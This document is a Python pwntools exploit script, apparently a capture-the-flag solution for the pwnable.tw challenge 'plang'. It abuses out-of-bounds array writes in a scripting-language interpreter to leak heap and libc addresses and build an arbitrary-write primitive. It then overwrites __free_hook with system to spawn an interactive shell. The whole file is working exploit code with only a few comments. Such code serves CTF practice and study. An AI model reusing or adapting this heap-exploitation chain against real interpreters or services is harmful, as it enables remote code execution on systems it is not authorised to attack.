from pwn import *
import decimal

p = None
ph = None
r = lambda x:p.recv(x)
rl = lambda:p.recvline
ru = lambda x:p.recvuntil(x)
rud = lambda x:p.recvuntil(x,drop=True)
s = lambda x:p.send(x)
sl = lambda x:p.sendline(x)
sla = lambda x,y:p.sendlineafter(x,y)
sa = lambda x,y:p.sendafter(x,y)
rn = lambda x:p.recvn(x)

# create a new context for this task
ctx = decimal.Context()

def float_to_str(f):
	"""
	Convert the given float to a string,
	without resorting to scientific notation
	"""
	d1 = ctx.create_decimal(f)
	return format(d1, 'f')

def writeany(addr,value):
	ph.sendlineafter('choice:\n',str(2))
	ph.sendlineafter('input:\n',str(addr-8))
	pl_data = ph.recvuntil('\n')[:-1]
	info('{} -->double: {}'.format(hex(addr-8),pl_data))
	payload = 'c[-0x2e] = '+float_to_str(pl_data)
	sla('> ',payload)

	ph.sendlineafter('choice:\n',str(2))
	ph.sendlineafter('input:\n',str(value))
	pl_data = ph.recvuntil('\n')[:-1]
	info('{} -->double: {}'.format(hex(value),pl_data))
	payload = 'b[0] = '+float_to_str(pl_data)
	sla('> ',payload)

def pwn():
	global p
	global ph
	BIN_PATH = './plang'
	DEBUG = 1
	ATTACH = 0
	context.arch = 'amd64'
	ph = process('./help')
	if DEBUG == 1:
		p = process(BIN_PATH)
		elf = ELF(BIN_PATH)
		context.log_level = 'debug'
		context.terminal = ['tmux', 'split', '-h']
		if context.arch == 'amd64':
			libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else:
			libc = ELF('/lib/i386-linux-gnu/libc.so.6')
			
	else:
		p = remote('chall.pwnable.tw',10201)
		# libc = ELF('./libc_32.so.6')
		context.log_level = 'info'

	payload = 'var a = "This is a PoC!a"'
	sla('> ',payload)
	payload = 'System.print(a)'
	sla('> ',payload)
	payload = 'var b = [1, 2, 3]'
	sla('> ',payload)
	payload = 'var c = [1, 2, 3]'
	sla('> ',payload)
	# b's addr: 0x5555557855e0
	payload = 'b[-0x662] = a'
	sla('> ',payload)

	# leak heap addr
	heap_addr = ''
	for i in range(8,15):
		payload = 'System.print(a.byteAt_({}))'.format(i)
		ru('> ')
		sl(payload)
		heap_addr += chr(int(ru('\n')[:-1]))
	heap_addr = u64(heap_addr.ljust(8,'\x00'))
	log.info('heap_addr:'+hex(heap_addr))

	heap_base = heap_addr-(0x55555577efa0-0x0000555555773000)
	info('heap_base:'+hex(heap_base))

	# leak libc addr
	# target addr:0x5555557741c0-->0x7ffff7ac8b78(main_arena+88)
	ph.sendlineafter('choice:\n',str(2))
	ph.sendlineafter('input:\n',str(4))
	pl_data = ph.recvuntil('\n')[:-1]
	info('4-->double:'+pl_data)
	payload = 'b[-0x1143] = '+float_to_str(pl_data)
	sla('> ',payload)
	# c's addr: 0x5555557858a0
	# b's buffer_ptr: 0x5555557855c0
	ph.sendlineafter('choice:\n',str(2))
	ph.sendlineafter('input:\n',str(heap_base+(0x5555557741b8-0x555555773000)))
	pl_data = ph.recvuntil('\n')[:-1]
	info('4-->double:'+pl_data)
	payload = 'c[-0x2e] = '+float_to_str(pl_data)
	sla('> ',payload)
	
	payload='System.print(b[0])'
	sla('> ',payload)
	libc_addr = ru('\n')[:-1]
	ph.sendlineafter('choice:\n',str(1))
	ph.sendlineafter('input:\n',libc_addr)
	libc_addr = int(ph.recvuntil('\n')[:-1],16)
	info('libc addr:'+hex(libc_addr))
	libc_base = (libc_addr&0xFFFFFFFFFFFFF000)-(0x00007ffff7ac8000-0x00007ffff7704000)
	info('libc base:'+hex(libc_base))

	if ATTACH==1:
		gdb.attach(p,'''
		b *0x555555554000+0x104a6
		b *0x555555554000+0x10496
		''')

	# write __free_hook
	# c's buffer_ptr: 0x00005555557858a0

	freehook_addr = libc_base+libc.symbols['__free_hook']
	system_addr = libc_base+libc.symbols['system']
	writeany(freehook_addr,system_addr) 
	value = u64('sh\x00'.ljust(8,'\x00'))
	writeany(heap_base+(0x5555557858a0-0x555555773000),value)

	payload = 'c.clear()'
	sla('> ',payload)
	
	p.interactive()

if __name__ == '__main__':
	pwn()
